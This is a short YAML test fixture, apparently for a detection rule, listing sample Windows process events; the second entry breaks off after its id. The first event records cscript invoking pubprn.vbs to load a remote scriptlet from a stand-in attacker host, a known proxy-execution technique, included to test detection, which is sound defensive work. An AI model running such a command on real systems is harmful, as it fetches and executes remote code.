docs:
- id: pubprn
  match: true
  doc:
    host:
      os: {type: windows}
      name: win1
    user: {name: alice}
    event: {category: process, type: start}
    process:
      name: cscript.exe
      executable: C:\Windows\System32\cscript.exe
      command_line: cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://evil.example/a.sct
      parent: {name: explorer.exe}
- id: appv
